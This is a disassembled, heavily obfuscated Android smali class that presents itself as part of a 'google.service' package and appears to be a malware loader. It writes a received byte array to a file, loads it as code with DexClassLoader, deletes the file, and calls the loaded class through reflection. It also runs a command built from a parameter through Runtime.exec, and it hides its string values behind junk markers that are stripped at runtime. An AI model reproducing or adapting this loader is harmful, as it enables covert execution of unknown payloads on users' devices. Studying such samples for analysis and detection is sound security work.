.class public Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;
.super Ljava/lang/Object;
.source "\ufe76\u02ce\u03c6\u1623\u02bf\u1623\u0999\u1d4e\u02be\u02be\u03b8\u1d35$\u4240\u02be\u02be\u03c6\u3164\u3164\u03c6\u064047720.java"


# static fields
.field public static id:I


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 9
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static Concatet(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;
    .locals 2

    .line 62
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x2

    if-le v0, v1, :cond_0

    .line 64
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    .line 66
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string p1, "\u2071\u1d47\u02be\u4240\u3164\u02d1$\u02cf\u0640\ufe73\uff9e$\u4240\u02bd\u02be\u1d4e"

    const-string p2, ""

    invoke-virtual {p0, p1, p2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method private static WhatRun(Ljava/lang/String;)Ljava/lang/Runtime;
    .locals 0

    .line 105
    :try_start_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    if-lez p0, :cond_0

    .line 107
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    const/4 p0, 0x0

    return-object p0
.end method

.method public static sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Class<",
            "*>;",
            "Landroid/content/Context;",
            ")Z"
        }
    .end annotation

    const-string v0, "activity"

    .line 12
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    const v0, 0x7fffffff

    .line 13
    invoke-virtual {p1, v0}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 14
    invoke-virtual {p0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iget-object v0, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 p0, 0x0

    return p0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method

.method public static ʿᵔㅤˎᵢㅤⶱᵇ䉀ʿˋ䉀䉀$䉀ⶱˈʼθˎʾʾⶱᴵ$$ⁱθᵢ4800([Ljava/lang/Object;)V
    .locals 3

    const/4 v0, 0x0

    .line 90
    aget-object v0, p0, v0

    check-cast v0, Landroid/content/Context;

    const/4 v1, 0x1

    .line 91
    aget-object p0, p0, v1

    check-cast p0, Ljava/lang/String;

    .line 92
    invoke-static {v0}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->ˉˎㅤᵇ$ㅤ$$ঙـⶱ䉀יﹳיⶱθˎⶨיⶱᵢㅤφφ4801(Landroid/content/Context;)Ljava/io/File;

    move-result-object v0

    .line 93
    invoke-virtual {v0}, Ljava/io/File;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_0

    :try_start_0
    const-string v1, "\u4240\u03b8\u1d62E\u02bfX\u1623\u03b8Bb\u02c9F\u02c6\u02c9\u03b8\u03c6T$\u02c9\u02ce"

    .line 95
    invoke-static {v1}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->WhatRun(Ljava/lang/String;)Ljava/lang/Runtime;

    move-result-object v1

    .line 96
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, p0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public static ˉˎㅤᵇ$ㅤ$$ঙـⶱ䉀יﹳיⶱθˎⶨיⶱᵢㅤφφ4801(Landroid/content/Context;)Ljava/io/File;
    .locals 2

    .line 21
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object p0

    if-nez p0, :cond_0

    .line 22
    new-instance p0, Ljava/io/File;

    invoke-static {}, Landroid/os/Environment;->getDataDirectory()Ljava/io/File;

    move-result-object v0

    sget-object v1, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX0:Ljava/lang/String;

    invoke-direct {p0, v0, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    return-object p0

    .line 24
    :cond_0
    new-instance p0, Ljava/io/File;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    sget-object v1, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX0:Ljava/lang/String;

    invoke-direct {p0, v0, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    return-object p0
.end method

.method public static declared-synchronized ˋˎˈⶱ䉀ˋˋⶱ$ˏ䉀ʽـ䉀ٴ$ʾˉˆʿθᘣㅤᵔᵇⶱᵔˈφ4798([Ljava/lang/Object;)Ljava/lang/Class;
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([",
            "Ljava/lang/Object;",
            ")",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    const-class v0, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;

    monitor-enter v0

    const/4 v1, 0x0

    .line 28
    :try_start_0
    aget-object v2, p0, v1

    check-cast v2, Landroid/content/Context;

    const/4 v3, 0x1

    .line 29
    aget-object v4, p0, v3

    check-cast v4, [B

    check-cast v4, [B

    .line 30
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v6, 0x2

    aget-object v6, p0, v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\u4240\ufe76S\u1d35\u02bb\u0cf2\u0559T\ufe76\u4240\u03c6\u02beO\u02bc\u02be\u02bf\u3164\u02c8P\u1d54\u0999\u02bf"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 31
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v7, 0x3

    aget-object p0, p0, v7

    check-cast p0, Ljava/lang/String;

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "\u0559X\ufe76\u4240\u03c6T\u02be\u0559Y\ufe76VC\u4240\u03c6X\u02be"

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 33
    invoke-static {v2}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->ˉˎㅤᵇ$ㅤ$$ঙـⶱ䉀יﹳיⶱθˎⶨיⶱᵢㅤφφ4801(Landroid/content/Context;)Ljava/io/File;

    move-result-object v6

    .line 34
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v7

    if-nez v7, :cond_0

    .line 35
    invoke-virtual {v6}, Ljava/io/File;->mkdir()Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_0
    const/4 v7, 0x0

    .line 40
    :try_start_1
    new-instance v8, Ljava/io/File;

    sget-object v9, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX3:Ljava/lang/String;

    const-string v10, "\u2071\u1d47\u02be\u4240\u3164\u02d1$\u02cf\u0640\ufe73\uff9e$\u4240\u02bd\u02be\u1d4e"

    sget v11, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->id:I

    invoke-static {v9, v10, v11}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->Concatet(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v6, v9}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 41
    sget v6, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->id:I

    add-int/2addr v6, v3

    sput v6, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->id:I

    .line 42
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 43
    array-length v6, v4

    invoke-virtual {v3, v4, v1, v6}, Ljava/io/FileOutputStream;->write([BII)V

    .line 44
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V

    .line 45
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catch_0
    move-object v8, v7

    :goto_0
    if-eqz v8, :cond_1

    :try_start_2
    const-string v3, "\u0559X\ufe76\u4240\u03c6T\u02be\u0559Y\ufe76VC\u4240\u03c6X\u02be"

    const-string v4, ""

    .line 51
    invoke-virtual {p0, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v2, p0, v1}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object p0

    .line 52
    new-instance v1, Ldalvik/system/DexClassLoader;

    invoke-virtual {v8}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v2

    invoke-direct {v1, v3, p0, v7, v2}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 53
    invoke-virtual {v8}, Ljava/io/File;->delete()Z

    const-string p0, "\u4240\ufe76S\u1d35\u02bb\u0cf2\u0559T\ufe76\u4240\u03c6\u02beO\u02bc\u02be\u02bf\u3164\u02c8P\u1d54\u0999\u02bf"

    const-string v2, ""

    .line 54
    invoke-virtual {v5, p0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, p0}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    monitor-exit v0

    return-object p0

    .line 58
    :catch_1
    :cond_1
    monitor-exit v0

    return-object v7

    :catchall_0
    move-exception p0

    monitor-exit v0

    throw p0
.end method

.method public static ㅤ$יʾˆθʾᵢㅤˎᴵㅤᴵㅤ$ʽﹳʻⶱי$θ$ᴵ$ㅤ䉀4799(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;
    .locals 12

    const-string v0, ""

    const/4 v1, 0x0

    .line 71
    aget-object v2, p1, v1

    check-cast v2, Landroid/content/Context;

    const/4 v3, 0x1

    .line 72
    aget-object v4, p1, v3

    check-cast v4, Ljava/lang/Class;

    .line 73
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v6, 0x2

    aget-object v7, p1, v6

    check-cast v7, Ljava/lang/String;

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "F\u4240B0\u03b8\u4240TS\u03b8\u1d62\u1d62"

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 74
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v9, 0x3

    aget-object v10, p1, v9

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "\u20abX\u4240X\u20ab\u4240\u03b8T\u1d62\u05d9B\u02bf\u03b8\u1d62\u05d9\u02bf"

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v11, 0x4

    .line 75
    aget-object p1, p1, v11

    check-cast p1, [B

    check-cast p1, [B

    if-eqz v4, :cond_0

    const-string v11, "\u02bc\u02be\u02bf\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc"

    .line 78
    invoke-virtual {p0, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    .line 81
    :try_start_0
    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object p0

    .line 82
    invoke-virtual {v5, v7, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    new-array v7, v9, [Ljava/lang/Class;

    const-class v11, Landroid/content/Context;

    aput-object v11, v7, v1

    const-class v11, Ljava/lang/String;

    aput-object v11, v7, v3

    const-class v11, [B

    aput-object v11, v7, v6

    invoke-virtual {v4, v5, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    new-array v5, v9, [Ljava/lang/Object;

    aput-object v2, v5, v1

    .line 83
    invoke-virtual {v8, v10, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v5, v3

    aput-object p1, v5, v6

    invoke-virtual {v4, p0, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :cond_0
    const/4 p0, 0x0

    :goto_0
    return-object p0
.end method
